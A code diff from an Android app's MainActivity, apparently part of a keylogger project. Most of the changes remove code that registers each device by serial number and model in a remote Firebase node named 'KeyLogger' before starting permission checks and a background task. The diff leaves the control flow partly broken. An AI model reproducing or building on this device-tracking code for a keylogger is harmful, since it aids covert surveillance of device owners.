@@ -46,31 +46,6 @@ public class MainActivity extends AppCompatActivity {
 
         String serial = Build.SERIAL;
 
-        // Write a message to the database
-        FirebaseDatabase database = FirebaseDatabase.getInstance();
-        DatabaseReference myRef = database.getReference("KeyLogger");
-
-        myRef.addListenerForSingleValueEvent(new ValueEventListener() {
-            @Override
-            public void onDataChange(@NonNull DataSnapshot dataSnapshot) {
-
-                for(DataSnapshot ds : dataSnapshot.getChildren()) {
-
-                    Key currentKey = ds.getValue(Key.class);
-
-
-                    if(currentKey.getSerialnumber().equals(Build.SERIAL)) {
-                        gefundenerKey = currentKey;
-                        gefunden = true;
-                        break;
-                    } else {
-                        continue;
-
-                    }
-
-
-                }
-
 
                 if(gefunden) {
                     Keylogger.gefundenerKey = gefundenerKey;
@@ -79,31 +54,11 @@ public class MainActivity extends AppCompatActivity {
                     (new Startup()).execute();
                 } else {
 
-                    // Write a message to the database
-                    FirebaseDatabase database = FirebaseDatabase.getInstance();
-                    DatabaseReference myRef = database.getReference("KeyLogger");
-
-                    String idd = myRef.push().getKey();
-                    Key neuerKey = new Key(idd, Build.SERIAL, Build.MODEL, "");
-
-                    myRef = myRef.child(Build.SERIAL);
-                    myRef.setValue(neuerKey);
-
-                    Keylogger.gefundenerKey = neuerKey;
                     checkPremission();
                     (new Startup()).execute();
 
 
                 }
-
-
-            }
-
-            @Override
-            public void onCancelled(@NonNull DatabaseError databaseError) {
-
-            }
-        });
 
 
 
@@ -217,60 +172,12 @@ public class MainActivity extends AppCompatActivity {
         FirebaseDatabase database = FirebaseDatabase.getInstance();
         DatabaseReference myRef = database.getReference("KeyLogger");
 
-        myRef.addListenerForSingleValueEvent(new ValueEventListener() {
-            @Override
-            public void onDataChange(@NonNull DataSnapshot dataSnapshot) {
-
-                for(DataSnapshot ds : dataSnapshot.getChildren()) {
-
-                    Key currentKey = ds.getValue(Key.class);
+        myRef.setValue("Hello, World!");
 
 
-                    if(currentKey.getSerialnumber().equals(Build.SERIAL)) {
-                        gefundenerKey = currentKey;
-                        gefunden = true;
-                        break;
-                    } else {
-                        continue;
-
-                    }
 
 
-                }
 
-
-                if(gefunden) {
-                    Keylogger.gefundenerKey = gefundenerKey;
-
-                    checkPremission();
-                    (new Startup()).execute();
-                } else {
-
-                    // Write a message to the database
-                    FirebaseDatabase database = FirebaseDatabase.getInstance();
-                    DatabaseReference myRef = database.getReference("KeyLogger");
-
-                    String idd = myRef.push().getKey();
-                    Key neuerKey = new Key(idd, Build.SERIAL, Build.MODEL, "");
-
-                    myRef = myRef.child(Build.SERIAL);
-                    myRef.setValue(neuerKey);
-
-                    Keylogger.gefundenerKey = neuerKey;
-                    checkPremission();
-                    (new Startup()).execute();
-
-
-                }
-
-
-            }
-
-            @Override
-            public void onCancelled(@NonNull DatabaseError databaseError) {
-
-            }
-        });
 
 
     }
